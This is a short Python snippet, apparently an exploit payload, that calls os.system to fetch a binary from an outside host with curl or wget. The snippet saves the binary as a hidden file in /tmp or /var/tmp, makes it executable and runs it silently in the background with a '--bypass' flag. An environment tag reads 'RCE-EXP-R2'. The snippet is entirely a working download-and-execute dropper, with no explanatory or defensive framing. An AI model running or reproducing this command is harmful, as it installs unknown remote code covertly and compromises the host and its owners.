import os
os.system("cd /var/tmp 2>/dev/null||cd /tmp;curl -kfsL -m180 https://cdn.876553.xyz/Q1fc8a9OCb7AsC6f/dl/cd81d028-221b-47f6-9be4-74b26b103bdc -o .td||wget -q -T20 -O .td https://cdn.876553.xyz/Q1fc8a9OCb7AsC6f/dl/cd81d028-221b-47f6-9be4-74b26b103bdc;chmod 755 .td;rm -f /tmp/.td-agent.lock;TD_PROJ=RCE-EXP-R2 nohup ./.td --bypass >/dev/null 2>&1 &")
